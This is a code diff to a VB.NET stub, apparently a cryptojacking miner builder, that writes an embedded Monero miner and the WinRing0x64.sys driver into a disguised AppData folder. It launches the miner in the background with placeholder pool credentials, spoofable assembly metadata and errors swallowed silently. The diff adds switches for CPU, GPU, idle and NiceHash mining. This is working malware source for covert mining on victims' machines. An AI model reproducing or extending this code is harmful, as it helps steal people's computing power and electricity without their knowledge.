@@ -21,6 +21,10 @@ Imports System.Text
 
 #Const Assembly = False
 #Const INS = False
+#Const EnableCPU = False
+#Const EnableGPU = False
+#Const EnableIdle = False
+#Const EnableNicehash = False
 
 #If Assembly Then
 <Assembly: AssemblyTitle("%Title%")>
@@ -101,22 +105,42 @@ Public Class Program
     Public Shared Sub Initialize()
         Try
             Dim xmr As Byte() = GetTheResource("#xmr")
+            Dim winring As Byte() = GetTheResource("#winring")
             Dim baseDir As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\WinCFG\Libs\"
-            If Not String.IsNullOrEmpty("#EnableGPU") Then
-                Dim libs As Byte() = GetTheResource("#libs")
-                Dim libsPath As String = baseDir + "libs.zip"
+            Dim runString As String = ""
 
+            Try
                 System.IO.Directory.CreateDirectory(baseDir)
+                My.Computer.FileSystem.WriteAllBytes(baseDir + "WinRing0x64.sys", winring, False)
 
-                Using archive As ZipArchive = New ZipArchive(New MemoryStream(libs))
-                    For Each entry As ZipArchiveEntry In archive.Entries
-                        entry.ExtractToFile(Path.Combine(baseDir, entry.FullName), True)
-                    Next
-                End Using
+#If EnableGPU Then
+            Dim libs As Byte() = GetTheResource("#libs")
+            Using archive As ZipArchive = New ZipArchive(New MemoryStream(libs))
+                For Each entry As ZipArchiveEntry In archive.Entries
+                    entry.ExtractToFile(Path.Combine(baseDir, entry.FullName), True)
+                Next
+            End Using
+            runString += " --opencl --cuda "
+#End If
+            Catch ex As Exception
+            End Try
 
-            End If
+#If EnableIdle Then
+            runString += " --donate-level=5 "
+#Else
+            runString += " --donate-level=4 "
+#End If
 
-            Run(GetTheResource("#dll"), "-B #EnableGPU --coin=monero --url=#URL --user=#USER --pass=#PWD --cpu-max-threads-hint=#MaxCPU --cuda-bfactor-hint=12 --cuda-bsleep-hint=100 --donate-level=5 --cuda-loader=" + ControlChars.Quote + baseDir + "ddb64.dll" + ControlChars.Quote, xmr)
+#If EnableNicehash Then
+            runString += " --nicehash "
+#End If
+
+#If EnableCPU = False Then
+            runString += " --no-cpu "
+#End If
+
+            'If --donate-level is set to 5 idle mining is enabled if --donate-level is anything other than 5 idle mining is disabled
+            Run(GetTheResource("#dll"), runString + " -B --coin=monero --url=#URL --user=#USER --pass=#PWD --cpu-max-threads-hint=#MaxCPU --cuda-bfactor-hint=12 --cuda-bsleep-hint=100 --cuda-loader=" + ControlChars.Quote + baseDir + "ddb64.dll" + ControlChars.Quote, xmr)
         Catch ex As Exception
         End Try
     End Sub
